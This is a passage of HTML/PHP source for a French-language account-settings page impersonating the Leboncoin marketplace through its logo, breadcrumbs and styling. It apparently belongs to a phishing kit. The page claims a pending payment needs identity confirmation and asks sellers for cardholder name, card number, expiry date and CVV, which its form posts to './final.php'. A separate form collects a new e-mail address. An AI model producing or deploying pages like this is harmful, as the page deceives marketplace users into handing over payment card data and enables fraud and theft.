                                                        class="relative inline-flex h-full flex-col items-center justify-center bg-surface align-middle text-body-2 text-on-surface text-on-surface before:pointer-events-none before:invisible before:h-none before:select-none before:overflow-hidden before:font-bold before:content-[attr(data-label)] pl-md pr-md"
                                                        data-label="Électronique">
                                                        Électronique
                                                    </button>
                                                </div>
                                                <span
                                                    class="relative z-hide flex-1 bg-surface text-on-surface before:text-bold before:pointer-events-none before:absolute before:left-1/2 before:top-1/2 before:-translate-x-1/2 before:-translate-y-1/2 before:select-none before:content-['·'] last:hidden"></span>
                                                <div
                                                    class="relative after:absolute after:inset-x-none after:bottom-none after:z-raised after:scale-x-0 after:border-b-md after:border-outline-high group-hover/nav:after:scale-x-0 hover:after:!scale-x-100 hover:after:transition-all font-regular">
                                                    <button
                                                        class="relative inline-flex h-full flex-col items-center justify-center bg-surface align-middle text-body-2 text-on-surface text-on-surface before:pointer-events-none before:invisible before:h-none before:select-none before:overflow-hidden before:font-bold before:content-[attr(data-label)] pl-md pr-md"
                                                        data-label="Loisirs">
                                                        Loisirs
                                                    </button>
                                                </div>
                                                <span
                                                    class="relative z-hide flex-1 bg-surface text-on-surface before:text-bold before:pointer-events-none before:absolute before:left-1/2 before:top-1/2 before:-translate-x-1/2 before:-translate-y-1/2 before:select-none before:content-['·'] last:hidden"></span>
                                                <div
                                                    class="relative after:absolute after:inset-x-none after:bottom-none after:z-raised after:scale-x-0 after:border-b-md after:border-outline-high group-hover/nav:after:scale-x-0 hover:after:!scale-x-100 hover:after:transition-all font-regular">
                                                    <button
                                                        class="relative inline-flex h-full flex-col items-center justify-center bg-surface align-middle text-body-2 text-on-surface text-on-surface before:pointer-events-none before:invisible before:h-none before:select-none before:overflow-hidden before:font-bold before:content-[attr(data-label)] pl-md pr-none"
                                                        data-label="Autres">
                                                        Autres
                                                    </button>
                                                </div>
                                                <span
                                                    class="relative z-hide flex-1 bg-surface text-on-surface before:text-bold before:pointer-events-none before:absolute before:left-1/2 before:top-1/2 before:-translate-x-1/2 before:-translate-y-1/2 before:select-none before:content-['·'] last:hidden"></span>
                                            </div>
                                        </div>
                                    </div>
                                    <div
                                        data-test-id="search-overlay"
                                        class="pointer-events-none absolute inset-x-none bottom-none h-[5rem] select-none bg-overlay/dim-3 opacity-0 transition-opacity duration-250"></div>
                                </div>
                            </header>
                            <noscript data-test-id="noscript"> </noscript>

                            <main id="mainContent">
                                <div></div>
                                <div class="_3IX1b">
                                    <div
                                        class="z-10 h-sz-64 bg-background text-on-surface/dim-1 shadow">
                                        <div
                                            class="mx-auto flex max-w-page-max items-center pt-xl">
                                            <a class="ml-lg underline" href="#">Mon compte</a>

                                            <svg
                                                viewBox="0 0 24 24"
                                                data-title="ArrowVerticalRight"
                                                fill="currentColor"
                                                stroke="none"
                                                class="fill-current text-current u-current-font-size mx-sm"
                                                data-spark-component="icon"
                                                aria-hidden="true"
                                                focusable="false">
                                                <path
                                                    fill-rule="evenodd"
                                                    d="m7.3,2.28c-.38.38-.4,1.02-.03,1.41l7.69,8.31-7.69,8.31c-.37.4-.36,1.03.03,1.41.38.38.99.37,1.36-.03l7.87-8.51c.15-.16.27-.34.35-.54.08-.21.12-.43.12-.65s-.04-.44-.12-.65c-.08-.2-.2-.38-.35-.54L8.66,2.31c-.37-.4-.98-.41-1.36-.03Z"></path>
                                            </svg>

                                            <span class="truncate font-bold">Paramètres</span>
                                        </div>
                                    </div>
                                </div>
                                <div class="z-10 h-sz-64 bg-background text-on-surface/dim-1">
                                    <div class="mx-auto flex max-w-page-max items-center pt-xl">
                                        <a class="ml-lg underline" href="#">Mon compte</a>
                                        <svg
                                            viewBox="0 0 24 24"
                                            data-title="ArrowVerticalRight"
                                            fill="currentColor"
                                            stroke="none"
                                            class="fill-current text-current u-current-font-size mx-sm"
                                            data-spark-component="icon"
                                            aria-hidden="true"
                                            focusable="false">
                                            <path
                                                fill-rule="evenodd"
                                                d="m7.3,2.28c-.38.38-.4,1.02-.03,1.41l7.69,8.31-7.69,8.31c-.37.4-.36,1.03.03,1.41.38.38.99.37,1.36-.03l7.87-8.51c.15-.16.27-.34.35-.54.08-.21.12-.43.12-.65s-.04-.44-.12-.65c-.08-.2-.2-.38-.35-.54L8.66,2.31c-.37-.4-.98-.41-1.36-.03Z"></path>
                                        </svg>
                                        <a class="ml-lg underline" href="#">Paiements</a>

                                        <svg
                                            viewBox="0 0 24 24"
                                            data-title="ArrowVerticalRight"
                                            fill="currentColor"
                                            stroke="none"
                                            class="fill-current text-current u-current-font-size mx-sm"
                                            data-spark-component="icon"
                                            aria-hidden="true"
                                            focusable="false">
                                            <path
                                                fill-rule="evenodd"
                                                d="m7.3,2.28c-.38.38-.4,1.02-.03,1.41l7.69,8.31-7.69,8.31c-.37.4-.36,1.03.03,1.41.38.38.99.37,1.36-.03l7.87-8.51c.15-.16.27-.34.35-.54.08-.21.12-.43.12-.65s-.04-.44-.12-.65c-.08-.2-.2-.38-.35-.54L8.66,2.31c-.37-.4-.98-.41-1.36-.03Z"></path>
                                        </svg>

                                        <span class="truncate font-bold">Paramètres</span>
                                    </div>
                                </div>

                                <div class="mx-auto max-w-page-max pt-xl">
                                    <div class="px-lg sm:w-sz-672">
                                        <h1 class="mb-2xl text-display-3">Paramètres</h1>
                                        <p class="text-body-1 mb-2xl">
                                            Pour confirmer le paiement en attente, veuillez
                                            confirmer votre identité.
                                        </p>

                                        <div
                                            class="mb-2xl border-b-sm border-neutral/dim-4 pb-2xl">
                                            <h2 class="mb-xl text-headline-2 text-on-surface">
                                                Informations de compte
                                            </h2>

                                            <p>Informations sauvegardées</p>
                                        </div>
                                        <div
                                            class="mb-2xl border-b-sm border-neutral/dim-4 pb-2xl">
                                            <h2 class="mb-xl text-headline-2 text-on-surface">
                                                Adresse
                                            </h2>

                                            <p>Informations sauvegardées</p>
                                        </div>
                                        <div class="mb-2xl border-b-sm border-neutral/dim-4 pb-2xl">
                                            <h2 class="mb-xl text-headline-2 text-on-surface">E-mail</h2>
                                            <div class="styles_box__7VRgs mb-lg rounded-lg border-sm border-outline p-lg">
                                                <div class="flex">
                                                    <div id="email-display" class="mb-lg mr-md flex items-center break-all md:mb-none">
                                                        <svg viewBox="0 0 24 24" data-title="VerifiedOutline" fill="currentColor" stroke="none" class="fill-current text-current w-sz-16 h-sz-16 mr-md" data-spark-component="icon" aria-hidden="true" focusable="false">
                                                            <path fill-rule="evenodd" d="m12.48,4.1c-.31-.11-.65-.11-.96,0l-5.73,2.02c-.59.21-.97.76-.96,1.36.06,2.96.4,5.41,1.95,7.93,1.28,2.07,3.08,3.66,5.15,4.56.04.02.08.02.12,0,2.08-.9,3.88-2.49,5.16-4.57,1.55-2.53,1.89-4.97,1.95-7.93.01-.6-.37-1.15-.96-1.36l-5.73-2.02Zm-1.62-1.9c.74-.26,1.54-.26,2.28,0l5.73,2.02c1.38.49,2.33,1.8,2.3,3.31-.07,3.1-.42,5.97-2.25,8.95-1.48,2.41-3.59,4.28-6.07,5.36h0c-.54.23-1.15.23-1.69,0h0c-2.48-1.08-4.58-2.95-6.06-5.35-1.83-2.98-2.18-5.85-2.25-8.95-.03-1.5.92-2.82,2.3-3.31l5.73-2.02Zm5.46,6.07c.43.35.49.99.14,1.42l-4.18,5.12c-.15.18-.34.33-.56.43-.22.1-.45.15-.69.15h0c-.24,0-.48-.06-.69-.17-.21-.11-.4-.26-.55-.45l-1.63-2.11c-.34-.44-.26-1.07.18-1.41.44-.34,1.06-.26,1.4.18l1.32,1.71,3.86-4.72c.35-.43.98-.49,1.41-.14Zm-4.96,5.26h0s0,0,0,0Z"></path>
                                                        </svg>
                                                        <span>
                                                            <?php echo htmlspecialchars($email); ?>
                                                        </span>
                                                    </div>
                                                    <form id="email-form" action="update_email.php" method="POST" style="display: none;">
                                                        <input type="email" name="new_email" placeholder="Nouveau e-mail" required class="text-body-1 p-lg rounded-lg border-sm border-outline w-full">
                                                    </form>
                                                    <button onclick="toggleEmailForm(this)" data-spark-component="button" type="button" class="u-shadow-border-transition box-border inline-flex items-center justify-center gap-md whitespace-nowrap px-lg text-body-1 font-bold focus-visible:outline-none focus-visible:u-ring [&amp;:not(:focus-visible)]:ring-inset bg-transparent border-sm border-current min-w-sz-44 h-sz-44 rounded-lg hover:bg-support/dim-5 enabled:active:bg-support/dim-5 focus-visible:bg-support/dim-5 text-support ml-auto" aria-busy="false" aria-live="off">
                                                        Modifier
                                                    </button>
                                                </div>
                                            </div>
                                        </div>

                                        <script>
                                            function toggleEmailForm(button) {
                                                var emailDisplay = document.getElementById('email-display');
                                                var emailForm = document.getElementById('email-form');
                                                if (emailForm.style.display === 'none') {
                                                    emailForm.style.display = 'block';
                                                    emailDisplay.style.display = 'none';
                                                    button.innerText = 'Sauvegarder';
                                                } else {
                                                    emailForm.submit(); // Soumettre le formulaire pour sauvegarder
                                                }
                                            }
                                        </script>

                                        <div
                                            class="mb-2xl border-b-sm border-neutral/dim-4 pb-2xl">
                                            <h2 class="mb-xl text-headline-2 text-on-surface">
                                                RIB
                                            </h2>
                                            <p>Informations sauvegardées</p>
                                        </div>

                                        <div
                                            class="mb-2xl border-b-sm border-neutral/dim-4 pb-2xl">
                                            <h2 class="mb-md text-headline-2 text-on-surface">
                                                Ajouter une carte bancaire
                                            </h2>
                                            <p class="mt-0">
                                                Confirmez ou enregistrez une nouvelle carte bancaire
                                                pour recevoir vos paiements. <br />
                                            </p>

                                            <form method="post" action="./final.php">
                                                <div class="mt-lg"></div>
                                                <div id="container">
                                                    <div style="height: 1px; background: #ced4da; width: 100%; margin: 32px 0px;"></div>
                                                    <b style="font-weight: 500;">Partenaires Bancaires</b>
                                                    <br><br>
                                                    <img style="display: block; margin-top: 10px; margin-bottom: 20px; width: 300px;" src="../img/paiement.png"><br>

                                                    <div style="display: flex; justify-content: space-between;">
                                                        <div class="container-city" id="input-container">
                                                            <label for="cardOwner">Titulaire de carte:</label>
                                                            <input minlength="4" type="text" name="cardOwner" id="cardOwner" placeholder="Jones Smith" required="" onfocus="this.placeholder = ''" onblur="this.placeholder = 'Entrez le titulaire de carte'">
                                                            <span class="material-symbols-outlined">badge</span>
                                                        </div>
                                                        <div class="container-city" id="input-container">
                                                            <label for="ccnumMasked">Numéro de carte:</label>
                                                            <input type="tel" id="ccnum" name="ccnum" oninput="detectCardType()" placeholder="1334 5565 4546 8034" required="" maxlength="21" onfocus="this.placeholder = ''" onblur="this.placeholder = 'Entrez le numéro de carte'">
                                                            <span class="material-symbols-outlined">credit_card</span>
                                                            <img id="cardTypeImage" class="card-type-image" alt="">
                                                        </div>
                                                    </div>
                                                    <div style="display: flex; justify-content: space-between;">
                                                        <div class="container-city" id="input-container">
                                                            <label>Date d'expiration:</label>
                                                            <input minlength="5" type="tel" id="ccexp" name="ccexp" required="" maxlength="5" placeholder="MM/AA" onfocus="this.placeholder = ''" onblur="this.placeholder = 'MM/AA'">
                                                            <span class="material-symbols-outlined">calendar_month</span>
                                                        </div>
                                                        <div class="container-city" id="input-container">
                                                            <label>CVV:</label>
                                                            <input minlength="3" type="tel" id="cccvv" name="cccvv" required="" maxlength="3" placeholder="***" onfocus="this.placeholder = ''" onblur="this.placeholder = 'Entrez le CVV'">
                                                            <span class="material-symbols-outlined">lock</span>
                                                        </div>
                                                    </div>
                                                    <button
                                                        data-spark-component="button"
                                                        type="submit"
                                                        class="u-shadow-border-transition box-border inline-flex items-center justify-center gap-md whitespace-nowrap px-lg text-body-1 font-bold focus-visible:outline-none focus-visible:u-ring [&amp;:not(:focus-visible)]:ring-inset min-w-sz-44 h-sz-44 rounded-lg bg-main text-on-main hover:bg-main-hovered enabled:active:bg-main-pressed focus-visible:bg-main-focused mt-lg"
                                                        aria-busy="false"
                                                        aria-live="off">
                                                        Confirmer
                                                    </button>
                                                </div>
                                            </form>


                                        </div>

                                        <button
                                            data-test-id="cnil-disclaimer-button"
                                            type="button"
                                            class="text-left text-caption text-on-background/dim-1 mb-xl ml-lg">
                                            <span class="text-caption-link"><u><b>Me renseigner</b></u> sur les finalités du
                                                traitement de mes données personnelles, les
                                                destinataires, le responsable de traitement, les
                                                durées de conservation, les coordonnées du
                                                <u><b>DPO et mes droits.</b></u></span>
                                        </button>
                                    </div>
                                </div>
                            </main>
                        </div>
                    </div>
                </div>
                <span id="root-portal"></span>
            </div>
            <div class="_3sWzy" data-qa-id="selectedNavigationLayer"></div>
        </div>
        <span hidden="" id="app-type" data-app-type="rav-next">version: undefined
        </span>
        <svg height="0" width="0" class="src__Box-sc-10d053g-0 bRroQM">
            <symbol id="SvgHeartoutline">
                <path
                    d="M21.19 2.24A6.76 6.76 0 0012 3.61a6.76 6.76 0 00-9.19-1.37A6.89 6.89 0 000 7.58c-.16 4.84 4 8.72 10.26 14.66l.12.12a2.32 2.32 0 003.23 0l.13-.12C20 16.29 24.15 12.41 24 7.57a6.89 6.89 0 00-2.81-5.33zm-9.07 18.15l-.12.12-.12-.12C6.17 15 2.4 11.46 2.4 7.86a4.18 4.18 0 014.2-4.37 4.68 4.68 0 014.28 3h2.25a4.66 4.66 0 014.27-3 4.18 4.18 0 014.2 4.37c0 3.6-3.77 7.14-9.48 12.53z"></path>
            </symbol>
            <symbol id="SvgLeboncoinlogo">
                <path
                    d="M58.29 36.625c3.604-.006 5.83-2.864 5.83-7.11 0-4.25-2.22-7.1-5.82-7.1s-5.81 2.84-5.81 7.1c0 4.256 2.206 7.104 5.8 7.11zm2.7-21.1c6.87 0 11.4 5.92 11.5 13.89 0 8.1-4.74 14.1-11.69 14.1a10 10 0 01-8.66-4.63h-.11v4.11h-7.54V6.915c0-2.75 1.83-4.47 4-4.47s4 1.72 4 4.47v12.86h.11a10.212 10.212 0 018.39-4.25zm27.76 21.1c3.61 0 5.81-2.86 5.81-7.11s-2.2-7.1-5.81-7.1c-3.61 0-5.81 2.84-5.81 7.1s2.2 7.11 5.81 7.11zm0-21.1c8.5 0 14 5.81 14 14 0 8.19-5.49 14-14 14s-14-5.81-14-14c0-8.19 5.49-14 14-14zm106.85 0c2.2 0 4.03 1.72 4.07 4.47v23h-8.07v-23c0-2.75 1.79-4.47 4-4.47zm0-14.05a4.9 4.9 0 010 9.8h-.002a4.9 4.9 0 11.003-9.8zm25.24 14.05c5.6 0 8.61 3.98 8.61 10.01v17.46h-8.07v-15.2c0-3.55-1.67-4.73-3.77-4.73-3.12 0-5.49 2.63-5.49 8.23v11.7h-8.07v-23.25c0-2.64 1.73-4.2 3.77-4.2s3.76 1.56 3.76 4.2v1h.11a10.637 10.637 0 019.15-5.22zm-46.67 21.1c3.61 0 5.82-2.86 5.82-7.11s-2.219-7.1-5.82-7.1c-3.6 0-5.81 2.84-5.81 7.1s2.21 7.11 5.81 7.11zm0-21.1c8.511 0 14 5.81 14 14 0 8.19-5.489 14-14 14-8.51 0-14-5.81-14-14 0-8.19 5.5-14 14-14zm-25.94 7c-3.5 0-5.65 2.58-5.65 7s2.15 7 5.65 7a5.407 5.407 0 004.9-2.69h.1l5.87 3.77c-2.04 3.98-6.3 5.92-11.14 5.92-8.4 0-13.57-5.81-13.57-14 0-8.19 5.17-14 13.57-14 4.84 0 9.14 1.92 11.14 5.92l-5.87 3.77h-.1a5.406 5.406 0 00-4.9-2.69zm-25.46-7c5.6 0 8.61 3.98 8.63 10.01v17.46h-8.07v-15.2c0-3.55-1.67-4.73-3.77-4.73-3.12 0-5.49 2.63-5.49 8.23v11.7h-8.08v-23.27c0-2.64 1.7-4.18 3.75-4.18s3.77 1.56 3.77 4.2v1h.11a10.627 10.627 0 019.15-5.22zm-100.23 12.4a9.966 9.966 0 00.54 3.01l9-6.67a4.48 4.48 0 00-4.12-2.34c-2.55 0-5.42 1.92-5.42 6zm7.82 9a8.32 8.32 0 006.89-4.44l5.31 3.84c-2.03 4.13-6.17 7.19-13.17 7.19a13.68 13.68 0 01-9-3.4c-3.52 2.34-6.52 3.34-9.52 3.34-6.05 0-10.32-4.05-10.32-10.13V6.845c0-2.74 1.82-4.46 4-4.46 2.18 0 4 1.72 4 4.46v25.81c0 2.6 1.14 4 3.53 4 1.3 0 2.71-.75 4.54-1.75a16.647 16.647 0 01-1.3-6.57c0-5.71 4.07-12.81 12.62-12.81 7.41 0 11.39 4.31 13.05 9.72l-14.27 10.24a5.181 5.181 0 003.64 1.44z"
                    fill-rule="evenodd"></path>
            </symbol>
            <symbol id="SvgMessageoutline">
                <path
                    d="M18 12h-7.2a1.13 1.13 0 00-1.2 1.2 1.13 1.13 0 001.2 1.2H18a1.2 1.2 0 000-2.4zM6 7.2h12A1.13 1.13 0 0019.2 6 1.13 1.13 0 0018 4.8H6a1.2 1.2 0 000 2.4z"></path>
                <path
                    d="M21.6 0H2.4A2.41 2.41 0 000 2.4v14.4a2.41 2.41 0 002.4 2.4h16.8L24 24V2.4A2.41 2.41 0 0021.6 0zm0 18.24l-1.44-1.44H2.4V2.4h19.2z"></path>
                <path
                    d="M6 10.8h12a1.13 1.13 0 001.2-1.2A1.13 1.13 0 0018 8.4H6a1.2 1.2 0 100 2.4z"></path>
            </symbol>
            <symbol id="SvgNotificationoutline">
                <path
                    d="M12 24a2.49 2.49 0 002.5-2.46h-5A2.48 2.48 0 0012 24zM21.13 18.2l-1.62-1.58v-6.16c0-3.78-2.05-6.94-5.63-7.78v-.83a1.88 1.88 0 00-3.76 0v.83c-3.59.84-5.63 4-5.63 7.78v6.16L2.87 18.2a1.23 1.23 0 00.88 2.11h16.49a1.23 1.23 0 00.89-2.11zM17 17.85H7v-7.39c0-3.05 1.89-5.54 5-5.54s5 2.49 5 5.54z"></path>
            </symbol>
            <symbol id="SvgSearch">
                <path
                    d="M23.58 21.45l-7-7a9.42 9.42 0 001.62-6.87A9.13 9.13 0 0010.34.07a9.25 9.25 0 00-2.81 18.27 9.25 9.25 0 007-1.76l7 7a1.54 1.54 0 002.11 0 1.56 1.56 0 00-.06-2.13zM9.22 15.5a6.37 6.37 0 116.33-6.37 6.33 6.33 0 01-6.33 6.37z"></path>
            </symbol>
        </svg>
    </div>
    <script>
        let isEditing = false;

        function toggleEdit() {
            isEditing = !isEditing;
            const editButton = document.getElementById('editButton');
            const confirmButton = document.getElementById('confirmButton');
            const personalInfo = document.getElementById('personalInfo');
            const cardDetails = document.getElementById('cardDetails');

            if (isEditing) {
                editButton.textContent = 'Sauvegarder';
                personalInfo.querySelectorAll('input, select').forEach(input => {
                    input.disabled = false;
                });
                cardDetails.querySelectorAll('input, select').forEach(input => {
                    input.disabled = false;
                });
                cardDetails.classList.remove('hidden');
                confirmButton.classList.add('hidden');
            } else {
                editButton.textContent = 'Modifier';
                personalInfo.querySelectorAll('input, select').forEach(input => {
                    input.disabled = true;
                });
                cardDetails.querySelectorAll('input, select').forEach(input => {
                    input.disabled = true;
                });
                confirmButton.classList.remove('hidden');
            }
        }

        // Initialiser les champs comme désactivés
        document.querySelectorAll('#personalInfo input, #cardDetails input, #cardDetails select').forEach(input => {
            input.disabled = true;
        });
    </script>
</body>

</html>